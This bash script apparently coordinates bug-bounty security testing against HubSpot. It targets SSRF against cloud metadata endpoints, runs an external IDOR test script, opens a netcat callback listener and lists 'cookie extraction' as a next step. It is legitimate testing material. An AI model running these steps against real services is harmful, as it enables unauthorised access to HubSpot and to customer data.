#!/bin/bash
# Enhanced HubSpot Testing Execution Script
# Based on Grok4's security recommendations
# Date: August 20, 2025

echo "========================================"
echo "ENHANCED HUBSPOT SECURITY TESTING"
echo "With Grok4 Safety Modifications"
echo "========================================"

# Create evidence directory
EVIDENCE_DIR="/home/kali/bbhk/hacks/hubspot/evidence_$(date +%Y%m%d_%H%M%S)"
mkdir -p $EVIDENCE_DIR
cd /home/kali/bbhk/hacks/hubspot

echo "[*] Evidence directory: $EVIDENCE_DIR"

# Safety check - VM snapshot reminder
echo ""
echo "⚠️  SAFETY CHECKLIST:"
echo "  [ ] VM snapshot created?"
echo "  [ ] VPN/proxy active?"
echo "  [ ] Test account ready?"
echo ""
read -p "Press Enter to continue or Ctrl+C to abort..."

# Terminal 1: Enhanced network capture with parsing
echo "[*] Starting enhanced network capture..."
sudo tcpdump -i any -w $EVIDENCE_DIR/raw_capture.pcap \
  '(host 169.254.169.254 or host metadata.google.internal or 
    host kubernetes.default.svc or port 8080 or port 443)' \
  -c 10000 2>&1 | tee $EVIDENCE_DIR/tcpdump.log &
TCPDUMP_PID=$!

# Terminal 2: IDOR testing with enhanced logging
echo "[*] Executing IDOR vulnerability testing..."
python3 test_idor_vulnerabilities.py > $EVIDENCE_DIR/idor_full.log 2>&1 &
IDOR_PID=$!

# Monitor IDOR results in real-time
tail -f $EVIDENCE_DIR/idor_full.log | grep -i "vulnerable\|success\|found\|idor" | \
  tee $EVIDENCE_DIR/idor_findings.log &

# Terminal 3: Callback listener with logging
echo "[*] Starting callback listener on port 8080..."
nc -lvnp 8080 2>&1 | tee $EVIDENCE_DIR/callback.log &
NC_PID=$!

# Terminal 4: Automated evidence parsing setup
cat > $EVIDENCE_DIR/parse_evidence.sh << 'EOF'
#!/bin/bash
# Parse captured evidence for SSRF proof

echo "=== EVIDENCE PARSING RESULTS ==="
echo "Timestamp: $(date)"

# Parse tcpdump for metadata requests
echo ""
echo "[*] Checking for AWS metadata requests..."
tshark -r raw_capture.pcap -Y "ip.dst == 169.254.169.254" \
  -T fields -e frame.time -e ip.src -e ip.dst -e http.request.uri 2>/dev/null

echo ""
echo "[*] Checking for GCP metadata requests..."
tshark -r raw_capture.pcap -Y "http contains 'metadata.google'" \
  -T fields -e frame.time -e http.host -e http.request.uri 2>/dev/null

echo ""
echo "[*] Checking for Kubernetes API requests..."
tshark -r raw_capture.pcap -Y "http contains 'kubernetes'" \
  -T fields -e frame.time -e http.host -e http.request.uri 2>/dev/null

# Check for successful IDOR
echo ""
echo "[*] IDOR findings summary:"
grep -c "IDOR FOUND\|vulnerable" idor_full.log

# Check callback logs
echo ""
echo "[*] Callback connections:"
grep -c "connect" callback.log

echo ""
echo "=== END OF EVIDENCE PARSING ==="
EOF
chmod +x $EVIDENCE_DIR/parse_evidence.sh

# Wait for initial results (5 minutes)
echo ""
echo "[*] Waiting 5 minutes for initial results..."
sleep 300

# Parse initial evidence
echo ""
echo "[*] Parsing initial evidence..."
cd $EVIDENCE_DIR && ./parse_evidence.sh | tee initial_results.txt

# Decision point
echo ""
echo "========================================"
echo "INITIAL RESULTS CHECKPOINT"
echo "========================================"
grep -i "vulnerable\|success\|found" *.log | head -20

echo ""
echo "Next steps:"
echo "1. If IDOR vulnerabilities found → Continue testing"
echo "2. If no findings → Execute cookie extraction"
echo "3. If blocked → Prepare baseline submission"
echo ""

# Create cleanup script
cat > $EVIDENCE_DIR/cleanup.sh << 'EOF'
#!/bin/bash
# Cleanup test artifacts

echo "[*] Cleaning up test workflows..."
# Add workflow IDs to delete
WORKFLOW_IDS="44038192 44038202 44038223"

for ID in $WORKFLOW_IDS; do
  echo "  Deleting workflow $ID..."
  curl -X DELETE "https://api.hubapi.com/automation/v3/workflows/$ID" \
    -H "Authorization: Bearer <YOUR_HUBSPOT_TOKEN>" \
    -s -o /dev/null
done

echo "[*] Cleanup complete"
EOF
chmod +x $EVIDENCE_DIR/cleanup.sh

# Save process IDs for monitoring
echo "TCPDUMP_PID=$TCPDUMP_PID" > $EVIDENCE_DIR/pids.txt
echo "IDOR_PID=$IDOR_PID" >> $EVIDENCE_DIR/pids.txt
echo "NC_PID=$NC_PID" >> $EVIDENCE_DIR/pids.txt

echo ""
echo "[+] All testing processes started!"
echo "[+] Evidence directory: $EVIDENCE_DIR"
echo "[+] Monitor with: tail -f $EVIDENCE_DIR/*.log"
echo "[+] Parse evidence: $EVIDENCE_DIR/parse_evidence.sh"
echo "[+] Cleanup when done: $EVIDENCE_DIR/cleanup.sh"
echo ""
echo "⏰ Check back in 10 minutes for results!"